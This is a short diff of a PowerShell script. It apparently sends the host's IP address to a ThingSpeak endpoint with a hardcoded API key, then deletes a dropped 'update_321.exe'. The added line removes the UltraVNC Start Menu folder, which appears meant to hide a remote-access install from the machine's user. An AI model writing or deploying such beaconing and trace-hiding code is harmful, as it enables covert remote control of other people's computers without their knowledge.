@@ -27,6 +27,7 @@ $url = "https://api.thingspeak.com/update?api_key=F15031FIFGY353KO&field1=$ipa&f
 (New-Object System.Net.WebClient).DownloadString($url)
 #Invoke-WebRequest $url -Method Get
 Remove-Item "$Env:USERPROFILE\update_321.exe";
+Remove-Item 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\UltraVNC\' -Recurse
 exit;
 
 
